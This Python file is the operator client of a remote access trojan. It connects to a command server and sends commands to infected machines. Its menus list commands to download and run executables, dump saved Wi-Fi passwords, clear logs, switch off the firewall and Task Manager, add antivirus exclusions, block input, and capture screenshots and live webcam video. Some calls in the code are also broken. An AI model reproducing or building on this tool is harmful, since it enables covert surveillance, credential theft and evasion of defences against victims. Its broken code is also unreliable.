import base64
from random import randrange
import os
import queue
import time
import json
import socket
import threading
from tkinter import *
from PIL import Image, ImageTk

from dependencies.modules import surveillance


class USER_CLIENT:
    def __init__(self, USERNAME, PASSWORD, IP, PORT , USER_STRING = "user", LEN_SIZE = 100000) -> None:  
        self.LEN_SIZE = LEN_SIZE

        self.USERNAME = USERNAME
        self.PASSWORD = PASSWORD

        self.ip = IP
        self.port = PORT

        self.clients = {}
        self.results = []
        self.camera_frames = queue.Queue()

        self.USER_STRING = USER_STRING

        self.START_PINGER_INIT_COMMAND = "PINGER"
        self.GET_CLIENTS_INIT_COMMAND = "CLIENTS"
        self.CLIENT_DOESNT_EXIST_ERROR = "ERROR_CLIENT_DOESNT_EXIST"


    def send_message(self, message, con = None, encode = True):
        if not con:
            con = self.main_socket
        length_of_message = str(len(message))
        spaces_to_add = self.LEN_SIZE - len(length_of_message)
        message = length_of_message + " "*spaces_to_add + message
        if encode:
            con.send(message.encode())
        else:
            con.send(message)

    def recieve(self, con, decode = True):
        while True:
            try:
                message = con.recv(self.LEN_SIZE).decode('utf-8')
                message_size = int(message)
                return (
                    con.recv(message_size).decode("utf-8")
                    if decode
                    else con.recv(message_size)
                )
            except:
                pass

    def generate_initialization_message(self, role, username, password):
        init_dict = {"role": role, "username" : username, "password" : password}
        return json.dumps(init_dict)

    def generate_server_command(self, command):
        return json.dumps({"server_command" : command})


    def connect(self, is_normal, server_command = ""):
        initalization_message = self.generate_initialization_message(self.USER_STRING, "USERNAME", "PASSWORD")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))
        self.send_message(initalization_message, s)
        if not is_normal:
            self.send_message(self.generate_server_command(server_command), s)
        return s

    def init_main_sock(self):
        self.main_socket = self.connect(True)
    
    def __ping(self, ip, port):
            try:
                s = self.connect(is_normal = False, server_command = self.START_PINGER_INIT_COMMAND)
                data = json.dumps({"ip" : ip, "port" : port}) 
                while True:
                    self.send_message(data, s)
                    time.sleep(2)
            except Exception as e:
                print(e, "ping")


    def start_pinger(self):
        if self.main_socket:
            ip, port = self.main_socket.getsockname()
            t = threading.Thread(target = self.__ping, args = (ip, str(port)))
            t.start()
        else:
            raise Exception("Main socket does not exist.")



    def _start_updating_clients(self):
        s = self.connect(is_normal = False, server_command = self.GET_CLIENTS_INIT_COMMAND)
        while True:
            try:
                clients = self.recieve(s)
                self.clients = json.loads(clients)
            except Exception as e:
                print(e)

    
    def start_updating_clients(self):
        t = threading.Thread(target = self._start_updating_clients)
        t.start()

    def make_command(self, target_ip, target_port, module, command, continous, args):
        command_dict = {
            "ip" : target_ip, 
            "port" : target_port, 
            "module" : module, 
            "command" : command, 
            "args" : args, 
            "continous" : continous
        }
        return json.dumps(command_dict)
    
    def recieve_results(self):
        while True:
            data = self.recieve(self.main_socket)
            result_dict = json.loads(data)
            if result_dict["command"] == "start_camera":
                self.camera_frames.put(result_dict)
            else:    
                self.results.append(result_dict)

    
    def clear_screen(self):
        _ = os.system('cls') if os.name == 'nt' else os.system('clear') 

            
    def client_selection(self):
        self.clear_screen()
        choice = "r"
        while choice.lower() == "r":
            print("Here are the available clients:")
            print("   IP Address          Port")
            while len(self.clients) == 0:
                pass
            for k, v in self.clients.items():
                print(f"{k}. {v[0]}        {v[1]}")
            choice = input("\nChoose a client by its number, Enter r to refresh : ")
            if choice.lower() != "r":
                try:
                    self.module_selection(self.clients[choice])
                except:
                    choice = "r"
            self.clear_screen()
        
    def module_selection(self, client):
        self.clear_screen()
        modules = {
            1 : ("File system", "file_system"), 
            2 : ("System", "system"), 
            3 : ("Input Output", "input_output"), 
            4 : ("Surveillance", "surveillance"), 
            5 : ("Persistence", "persistence"), 
            6 : ("Troll", "troll"),    
        }
        while True:
            print("Here are the available modules: ")
            for k, v in modules.items():
                print(f"{k}. {v[0]}")
            print(f"{7}. Go back ")
            choice = int(input("\nPlease select a module from the above: "))
            if choice in list(range(1, 8)):
                if choice == 7:
                    self.client_selection()
                else:
                    self.command_selection(client, modules[choice][1])
            self.clear_screen()

    def command_selection(self, client, module):
        commands = {
            "file_system" : ["download_file_http", "download_run_exe", "listdir", "get_start_up_contents", "chdir", "getcwd", "list_current_directory", "delete_file", "delete_folder", "make_directory"],
            "input_output" : ["reverse_mouse_button", "block_all_input", "unblock_all_input", "block_mouse", "unblock_mouse", "block_mouse_seconds", "block_all_seconds", "block_smart_seconds", "get_clipboard", "paste_to_clipboard", "clipboard_filler", "filler_off", "get_foreground_window_title", "stop_disabler", "disable_current_windows_continous", "enable_current_window", "disable_current_window"],
            "surveillance" : ["screenshot", "get_available_devices", "start_camera"],
            "system" : ["create_account","get_accounts","disable_cmd_fully","disable_cmd","enable_cmd","firewall_on","firewall_off","get_cpu_usage","get_ram_usage_info","get_disk_usage_info","get_disk_info","get_hostfile_contents","write_hostfile_contents","get_installed_programs","run_uninstaller","enable_internet","disable_internet","clear_logs","get_adapter_stats","get_adapters","get_devices_on_network","get_wifi_networks_windows","get_wifi_passwords_windows","get_ip_info","get_country","get_public_ip","minimize_all_windows","freeze_pc","logout","restart","shutdown","kill_process","get_processes","geo_locate","get_username","get_uptime","get_system_info","enable_taskmanager","disable_taskmanager"],
            "troll" : ["show_message_box", "run_troll_script", "open_camera_app", "change_wallpaper_http", "eject_cd", "eject_cd_continous", "stop_cd_ejector", "type_message_notepad", "show_website"],
            "persistence" : ["add_extension_exclusion", "remove_extension_exclusion", "add_folder_exclusion", "remove_folder_exclusion"],
        } 
        command_list = commands[module]
        self.clear_screen()
        while True:
            print("Here are the commands for the module ")
            for i, command in enumerate(command_list, start=1):
                print(f"{i}. {command}")
            print(f"{i+1}. Go Back")
            try:
                choice = int(input("Choose the command to execute: "))
            except:
                continue
            if choice > 0 and choice <= len(command_list) + 1:
                if choice == i + 1:
                    self.module_selection(client)
                else:
                    self.get_args(client, module, command_list[choice - 1])
            self.clear_screen()


            
    def continuity_check(self, command):
        continous_commands = ["start_camera"]
        return command in continous_commands

    def get_args(self,client, module, command):
        self.clear_screen()
        args = []
        while True:
            choice = input("Does the command have arguments [Y/N]? ")
            if choice.lower() == "y":
                arg = input("Please enter an argument: ")
                args.append(arg)
                done = input("Done adding arguments [Y/n] ? ")
                if done.lower() == "y":
                    self.execute_command(client, module, command, args)
            else:
                self.execute_command(client, module, command, [""])


    def execute_command(self, client_info, module,command, args):
        continous = self.continuity_check(command)
        request = self.make_command(client_info[0], client_info[1], module, command, continous, args)
        self.send_message(request)
        print("Command Sent!")
        if not continous:
            print("Recieved Results : ", self.get_result_non_continous(command, client_info))
        else:
            print(self.cont_result_handler(command, client_info))
        input("Enter a key to continue!")
        self.command_selection(client_info, module)



    def camera_stream(self, label):
        while True:

            while self.stream_running and self.ready:
                data = self.camera_frames.get()
                size = data["size"]
                data =  base64.b64decode(data["result"])
                img = Image.frombytes("RGB", (size[1], size[0]), data)
                b, g, r = img.split()
                img = Image.merge("RGB", (r, g, b))
                img = img.transpose(Image.FLIP_TOP_BOTTOM)
                image_frame = ImageTk.PhotoImage(image = img)
                label.config(image=image_frame)
                label.image = image_frame

    def cont_result_handler(self, command, client_info):
        if command == "start_camera":
            self.stream_running = True
            root = Tk()
            root.title('Video Stream')
            video_label = Label(root)
            video_label.pack()
            self.ready = False
            thread = threading.Thread(target=self.camera_stream, args=(video_label,))
            thread.start()
            self.ready = True
            root.mainloop()
            try:
                self.stream_running = False
                self.send_message(self.make_command(client_info[0], client_info[1], "surveillance", "stop_camera", False, [""]), self.main_socket)
            except Exception as e:
                print(e)
            return "Done!"

    def non_cont_result_handler(self, r):
        command = r["command"]
        if command == "screenshot":
            im =  base64.b64decode(r["result"]["image"])
            img = Image.frombytes(r["result"]["mode"], tuple(r["result"]["size"]), im)
            name= f"{randrange(1,1150)}.png"
            img.save(name)
            return f"Image saved as {name}"
        else:
            return r['result']

    def get_result_non_continous(self, command):
        while True:
            for r in self.results:
                if r["command"] == command:
                    result = self.non_cont_result_handler(r)
                    self.results.remove(r)
                    return result

            time.sleep(1)
                    



user_client = USER_CLIENT("zain", "1234", "192.168.1.25", 9999)
user_client.init_main_sock()
user_client.start_pinger()
user_client.start_updating_clients()

t = threading.Thread(target = user_client.recieve_results)
t.start()



print(user_client.client_selection())